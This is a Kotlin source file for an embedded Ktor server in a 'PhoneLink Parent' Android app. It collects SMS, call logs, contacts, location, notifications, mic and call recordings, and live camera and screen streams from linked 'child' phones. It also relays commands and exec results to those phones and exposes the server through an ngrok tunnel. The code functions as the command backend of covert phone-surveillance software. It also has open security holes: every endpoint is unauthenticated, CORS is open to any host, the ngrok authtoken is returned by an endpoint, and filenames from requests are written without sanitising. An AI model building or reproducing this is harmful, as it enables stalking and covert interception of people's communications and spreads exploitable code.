package com.phonelink.parent.server

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import android.media.MediaScannerConnection
import android.os.Environment
import com.phonelink.parent.license.LicenseManager
import com.phonelink.parent.tunnel.TunnelManager
import com.phonelink.parent.utils.NetworkUtils
import io.ktor.http.ContentType
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.serialization.gson.gson
import io.ktor.server.application.call
import io.ktor.server.application.install
import io.ktor.server.cio.CIO
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.plugins.contentnegotiation.ContentNegotiation
import io.ktor.server.plugins.cors.routing.CORS
import io.ktor.server.request.receiveText
import io.ktor.server.response.respond
import io.ktor.server.response.respondBytes
import io.ktor.server.response.respondText
import io.ktor.server.routing.delete
import io.ktor.server.routing.get
import io.ktor.server.routing.post
import io.ktor.server.routing.routing
import io.ktor.server.websocket.WebSockets
import io.ktor.server.websocket.webSocket
import io.ktor.websocket.Frame
import io.ktor.websocket.WebSocketSession
import io.ktor.websocket.readText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.channels.ClosedReceiveChannelException
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.InputStream
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CopyOnWriteArrayList

/**
 * Embedded Ktor Server running inside the Parent Android App.
 * Handles both HTTP (REST API + static React Dashboard assets) and WebSockets on port 5000.
 */
class EmbeddedHubServer(private val context: Context, private val port: Int = 5000) {

    private val TAG = "EmbeddedHubServer"
    private var engine: ApplicationEngine? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val gson: Gson = GsonBuilder().setPrettyPrinting().create()

    // Active WebSocket connections
    // Key: deviceId, Value: Child phone WebSocketSession
    private val childSessions = ConcurrentHashMap<String, WebSocketSession>()
    // Set of Dashboard web clients
    private val dashboardSessions = CopyOnWriteArrayList<WebSocketSession>()

    // Memory Store & Cache
    private val devices = ConcurrentHashMap<String, MutableMap<String, Any?>>()
    private val calls = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val messages = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val locations = ConcurrentHashMap<String, MutableMap<String, Any?>>()
    private val contacts = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val notifications = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()

    private val dbFile = File(context.filesDir, "db.json")

    init {
        loadDatabase()
    }

    fun start() {
        if (engine != null) return
        try {
            engine = embeddedServer(CIO, port = port, host = "0.0.0.0") {
                install(WebSockets) {
                    maxFrameSize = Long.MAX_VALUE
                    masking = false
                }

                install(CORS) {
                    anyHost()
                    allowHeader(HttpHeaders.ContentType)
                    allowHeader(HttpHeaders.Authorization)
                }

                install(ContentNegotiation) {
                    gson()
                }

                routing {
                    // WebSocket Handler for both Root "/" and "/ws"
                    val wsHandler: suspend io.ktor.server.websocket.WebSocketServerSession.() -> Unit = {
                        handleWebSocketSession(this)
                    }
                    webSocket("/", handler = wsHandler)
                    webSocket("/ws", handler = wsHandler)

                    // ---------------- REST API Endpoints ----------------
                    get("/api/server-info") {
                        val ip = NetworkUtils.getLocalIpAddress(this@EmbeddedHubServer.context)
                        val info = mapOf(
                            "localIp" to ip,
                            "port" to port,
                            "localUrl" to "http://$ip:$port",
                            "connectedDevices" to childSessions.size,
                            "totalDevices" to devices.size
                        )
                        call.respond(info)
                    }

                    get("/api/devices") {
                        call.respond(devices.values.toList())
                    }

                    delete("/api/devices/{id}") {
                        val deviceId = call.parameters["id"]
                        if (deviceId != null) {
                            devices.remove(deviceId)
                            calls.remove(deviceId)
                            messages.remove(deviceId)
                            locations.remove(deviceId)
                            contacts.remove(deviceId)
                            notifications.remove(deviceId)
                            saveDatabase()
                            broadcastToDashboards(JSONObject().apply {
                                put("type", "device-removed")
                                put("deviceId", deviceId)
                            }.toString())
                            call.respond(mapOf("success" to true))
                        } else {
                            call.respond(HttpStatusCode.BadRequest, mapOf("error" to "Missing id"))
                        }
                    }

                    get("/api/devices/{id}/calls") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(calls[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/sms") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(messages[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/location") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(locations[id] ?: emptyMap<String, Any>())
                    }

                    get("/api/devices/{id}/contacts") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(contacts[id] ?: emptyList<Any>())
                    }

                    // Commercial Licensing API with Secret God Mode Support
                    get("/api/license/status") {
                        call.respond(LicenseManager.getLicenseStatus(this@EmbeddedHubServer.context))
                    }

                    post("/api/license/activate") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val licenseKey = json.optString("licenseKey", "")
                        val result = LicenseManager.activateLicense(this@EmbeddedHubServer.context, licenseKey)
                        call.respond(result)
                    }

                    post("/api/license/logout") {
                        call.respond(LicenseManager.logout(this@EmbeddedHubServer.context))
                    }

                    // ---------------- Ngrok Embedded Tunneling Management API ----------------
                    get("/api/tunnel/status") {
                        call.respond(mapOf(
                            "isRunning" to TunnelManager.isTunnelRunning(),
                            "activeUrl" to TunnelManager.getActiveUrl(),
                            "authtoken" to TunnelManager.getNgrokToken(this@EmbeddedHubServer.context),
                            "domain" to TunnelManager.getNgrokDomain(this@EmbeddedHubServer.context),
                            "autoStart" to TunnelManager.isAutoStart(this@EmbeddedHubServer.context)
                        ))
                    }

                    post("/api/tunnel/start") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val token = json.optString("authtoken", "")
                        val domain = json.optString("domain", "")
                        val autoStart = json.optBoolean("autoStart", true)

                        if (token.isNotEmpty() || domain.isNotEmpty()) {
                            TunnelManager.saveConfig(this@EmbeddedHubServer.context, token, domain, autoStart)
                        }

                        TunnelManager.startTunnel(this@EmbeddedHubServer.context, port)
                        call.respond(mapOf(
                            "success" to true,
                            "isRunning" to true,
                            "activeUrl" to TunnelManager.getActiveUrl()
                        ))
                    }

                    post("/api/tunnel/stop") {
                        TunnelManager.stopTunnel(this@EmbeddedHubServer.context)
                        call.respond(mapOf("success" to true, "isRunning" to false))
                    }

                    // ---------------- Direct File Save to Internal Storage PhoneLink Folder ----------------
                    post("/api/downloads/save") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val filename = json.optString("filename", "file_${System.currentTimeMillis()}.bin")
                        val b64 = json.optString("data", "")
                        if (b64.isNotEmpty()) {
                            val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                            val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                            saveToPhoneLinkFolder(filename, bytes)
                            call.respond(mapOf("success" to true, "filename" to filename))
                        } else {
                            call.respond(mapOf("success" to false, "error" to "No data provided"))
                        }
                    }

                    // ---------------- Static React Dashboard Asset Serving ----------------
                    get("/{path...}") {
                        val requestedPath = call.parameters.getAll("path")?.joinToString("/") ?: ""
                        serveStaticAsset(call, requestedPath)
                    }
                }
            }

            engine?.start(wait = false)
            Log.i(TAG, "Embedded Hub Server started on 0.0.0.0:$port")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start Embedded Hub Server: ${e.message}", e)
        }
    }

    fun stop() {
        try {
            engine?.stop(1000, 2000)
            engine = null
            Log.i(TAG, "Embedded Hub Server stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping server: ${e.message}", e)
        }
    }

    fun getConnectedDeviceCount(): Int = childSessions.size

    private suspend fun handleWebSocketSession(session: WebSocketSession) {
        var registeredDeviceId: String? = null
        var isDashboard = false

        try {
            for (frame in session.incoming) {
                if (frame is Frame.Text) {
                    val text = frame.readText()
                    try {
                        val json = JSONObject(text)
                        val type = json.optString("type")
                        val event = json.optString("event")
                        val msgType = if (type.isNotEmpty()) type else event

                        when (msgType) {
                            "dashboard-connect", "init" -> {
                                isDashboard = true
                                if (!dashboardSessions.contains(session)) {
                                    dashboardSessions.add(session)
                                }
                                // Send initial state to dashboard
                                session.send(Frame.Text(JSONObject().apply {
                                    put("type", "init-sync")
                                    put("devices", JSONArray(gson.toJson(devices.values)))
                                }.toString()))
                            }

                            "device-register" -> {
                                val dev = json.optJSONObject("device")
                                val devId = dev?.optString("deviceId") ?: json.optString("deviceId")
                                if (devId.isNotEmpty()) {
                                    registeredDeviceId = devId
                                    childSessions[devId] = session
                                    
                                    val devMap = devices.getOrPut(devId) { mutableMapOf() }
                                    devMap["deviceId"] = devId
                                    devMap["deviceName"] = dev?.optString("deviceName", "Android Device")
                                    devMap["battery"] = dev?.optInt("battery", 100)
                                    devMap["isCharging"] = dev?.optBoolean("isCharging", false)
                                    devMap["online"] = true
                                    devMap["last_seen"] = System.currentTimeMillis()
                                    if (dev?.has("model") == true) devMap["model"] = dev.optString("model")
                                    if (dev?.has("androidVersion") == true) devMap["androidVersion"] = dev.optString("androidVersion")

                                    saveDatabase()

                                    // Broadcast to dashboards
                                    broadcastToDashboards(JSONObject().apply {
                                        put("type", "device-status")
                                        put("deviceId", devId)
                                        put("online", true)
                                        put("device", JSONObject(gson.toJson(devMap)))
                                    }.toString())
                                }
                            }

                            "telemetry-update" -> {
                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val devMap = devices.getOrPut(devId) { mutableMapOf("deviceId" to devId) }
                                    if (json.has("battery")) devMap["battery"] = json.optInt("battery")
                                    if (json.has("isCharging")) devMap["isCharging"] = json.optBoolean("isCharging")
                                    devMap["online"] = true
                                    devMap["last_seen"] = System.currentTimeMillis()
                                    saveDatabase()
                                    broadcastToDashboards(text)
                                }
                            }

                            "calls-update" -> {
                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val callList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        json.optJSONArray("calls")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    calls[devId] = callList
                                    saveDatabase()
                                    broadcastToDashboards(text)
                                }
                            }

                            "sms-update" -> {
                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val smsList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        json.optJSONArray("messages")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    messages[devId] = smsList
                                    saveDatabase()
                                    broadcastToDashboards(text)
                                }
                            }

                            "location-update" -> {
                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val locMap: MutableMap<String, Any?> = gson.fromJson(
                                        json.optJSONObject("location")?.toString() ?: "{}",
                                        object : TypeToken<MutableMap<String, Any?>>() {}.type
                                    )
                                    locations[devId] = locMap
                                    saveDatabase()
                                    broadcastToDashboards(text)
                                }
                            }

                            "contacts-update" -> {
                                val devId = json.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val contactList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        json.optJSONArray("contacts")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    contacts[devId] = contactList
                                    saveDatabase()
                                    broadcastToDashboards(text)
                                }
                            }

                            // Command sent from Dashboard to target Child Phone
                            "command" -> {
                                val targetDeviceId = json.optString("deviceId")
                                val childSocket = childSessions[targetDeviceId]
                                if (childSocket != null) {
                                    childSocket.send(Frame.Text(text))
                                } else {
                                    Log.w(TAG, "Target child device not online: $targetDeviceId")
                                }
                            }

                            // File Download Response from Child Phone -> Automatically save to internal storage PhoneLink folder
                            "FILE_DOWNLOAD_RESPONSE", "file-download-response" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val name = payload.optString("name", "download_${System.currentTimeMillis()}.bin")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        saveToPhoneLinkFolder(name, bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save downloaded file: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Mic Audio Recording Result from Child Phone -> Save to PhoneLink folder
                            "MIC_RECORD_RESULT", "mic-record-result" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val recId = payload.optString("recordingId", "${System.currentTimeMillis()}")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        val ext = if (payload.optString("mimeType").contains("mp4") || payload.optString("mimeType").contains("m4a")) "m4a" else "mp3"
                                        saveToPhoneLinkFolder("mic_record_${recId}.$ext", bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save mic recording: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Call Recording Saved -> Save to PhoneLink folder
                            "CALL_RECORDING_SAVED", "call-recording-saved" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val fname = payload.optString("filename", "call_${System.currentTimeMillis()}.m4a")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        saveToPhoneLinkFolder(fname, bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save call recording: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Streaming Frames & Results: Forward directly to dashboard
                            "camera-frame", "screen-frame", "audio-chunk", "exec-result", "notification-alert" -> {
                                broadcastToDashboards(text)
                            }

                            else -> {
                                // Default broadcast to dashboards
                                if (!isDashboard) {
                                    broadcastToDashboards(text)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error handling message: ${e.message}", e)
                    }
                }
            }
        } catch (_: ClosedReceiveChannelException) {
        } catch (e: Exception) {
            Log.e(TAG, "WebSocket error: ${e.message}")
        } finally {
            if (isDashboard) {
                dashboardSessions.remove(session)
            }
            if (registeredDeviceId != null) {
                childSessions.remove(registeredDeviceId)
                devices[registeredDeviceId]?.let {
                    it["online"] = false
                    it["last_seen"] = System.currentTimeMillis()
                }
                saveDatabase()
                broadcastToDashboards(JSONObject().apply {
                    put("type", "device-status")
                    put("deviceId", registeredDeviceId)
                    put("online", false)
                }.toString())
            }
        }
    }

    private fun broadcastToDashboards(text: String) {
        val frame = Frame.Text(text)
        scope.launch {
            for (dash in dashboardSessions) {
                try {
                    dash.send(frame)
                } catch (_: Exception) {
                    dashboardSessions.remove(dash)
                }
            }
        }
    }

    private suspend fun serveStaticAsset(call: io.ktor.server.application.ApplicationCall, requestedPath: String) {
        val assetPath = if (requestedPath.isBlank() || requestedPath == "/") {
            "dashboard/index.html"
        } else {
            "dashboard/$requestedPath"
        }

        var stream: InputStream? = null
        var contentType = getMimeType(assetPath)

        try {
            stream = context.assets.open(assetPath)
        } catch (_: Exception) {
            // SPA Fallback: If not found, serve dashboard/index.html
            try {
                stream = context.assets.open("dashboard/index.html")
                contentType = ContentType.Text.Html
            } catch (_: Exception) {}
        }

        if (stream != null) {
            val bytes = stream.use { it.readBytes() }
            call.respondBytes(bytes, contentType)
        } else {
            call.respondText("PhoneLink Parent Hub Asset Not Found", ContentType.Text.Plain, HttpStatusCode.NotFound)
        }
    }

    private fun getMimeType(path: String): ContentType {
        return when {
            path.endsWith(".html") -> ContentType.Text.Html
            path.endsWith(".js") -> ContentType.Application.JavaScript
            path.endsWith(".css") -> ContentType.Text.CSS
            path.endsWith(".svg") -> ContentType.parse("image/svg+xml")
            path.endsWith(".json") -> ContentType.Application.Json
            path.endsWith(".png") -> ContentType.parse("image/png")
            path.endsWith(".jpg") || path.endsWith(".jpeg") -> ContentType.parse("image/jpeg")
            path.endsWith(".ico") -> ContentType.parse("image/x-icon")
            path.endsWith(".woff2") -> ContentType.parse("font/woff2")
            path.endsWith(".woff") -> ContentType.parse("font/woff")
            path.endsWith(".ttf") -> ContentType.parse("font/ttf")
            else -> ContentType.Application.OctetStream
        }
    }

    private fun loadDatabase() {
        if (!dbFile.exists()) return
        try {
            val text = dbFile.readText()
            val json = JSONObject(text)
            
            if (json.has("devices")) {
                val list: List<Map<String, Any?>> = gson.fromJson(
                    json.getJSONArray("devices").toString(),
                    object : TypeToken<List<Map<String, Any?>>>() {}.type
                )
                list.forEach { dev ->
                    val id = dev["deviceId"]?.toString() ?: ""
                    if (id.isNotEmpty()) {
                        val m = dev.toMutableMap()
                        m["online"] = false // reset on server boot
                        devices[id] = m
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error loading database: ${e.message}")
        }
    }

    private fun saveDatabase() {
        scope.launch {
            try {
                val json = JSONObject().apply {
                    put("devices", JSONArray(gson.toJson(devices.values)))
                }
                dbFile.writeText(json.toString(2))
            } catch (e: Exception) {
                Log.e(TAG, "Error saving database: ${e.message}")
            }
        }
    }

    fun saveToPhoneLinkFolder(filename: String, dataBytes: ByteArray) {
        try {
            val phoneLinkDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "PhoneLink")
            if (!phoneLinkDir.exists()) {
                phoneLinkDir.mkdirs()
            }
            val target = File(phoneLinkDir, filename)
            target.writeBytes(dataBytes)
            MediaScannerConnection.scanFile(context, arrayOf(target.absolutePath), null, null)
            Log.i(TAG, "📁 Saved file to PhoneLink folder: ${target.absolutePath} (${dataBytes.size} bytes)")
        } catch (e: Exception) {
            Log.w(TAG, "Failed saving file to PhoneLink folder: ${e.message}")
        }
    }
}

